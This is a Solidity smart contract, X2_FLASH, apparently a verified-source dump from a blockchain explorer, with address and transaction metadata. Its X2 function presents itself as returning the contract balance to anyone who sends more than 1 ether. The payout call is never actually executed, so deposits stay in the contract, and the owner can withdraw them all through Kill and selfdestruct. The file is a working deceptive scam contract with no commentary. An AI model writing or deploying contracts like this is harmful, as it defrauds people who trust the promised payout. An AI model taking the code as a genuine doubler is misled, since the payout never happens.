
//Address: 0x2F30fF3428D62748A1d993F2Cc6C9B55dF40B4d7
//Contract name: X2_FLASH
//Balance: 0 Ether
//Verification Date: 6/9/2018
//Transacion Count: 3

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract X2_FLASH  
{
    address owner = msg.sender;
    
    function() public payable {}
    
    function X2()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}
